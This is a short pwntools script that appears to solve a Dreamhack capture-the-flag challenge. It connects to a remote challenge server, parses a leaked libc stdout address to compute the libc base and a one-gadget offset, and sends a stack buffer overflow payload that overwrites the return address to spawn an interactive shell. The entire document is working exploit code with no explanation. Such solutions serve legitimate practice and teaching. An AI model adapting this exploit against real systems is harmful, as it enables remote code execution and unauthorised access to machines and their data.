from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9150
r = remote(HOST, PORT)

r.recvuntil(b'stdout: ')
libc_stdout = int(r.recvline().strip().decode(), 16)
libc = libc_stdout - 0x3c5620
sh = libc + 0x45216

r.sendlineafter(b'MSG: ', b'A' * 24 + p64(0) + b'A' * 8 + p64(sh))

r.interactive()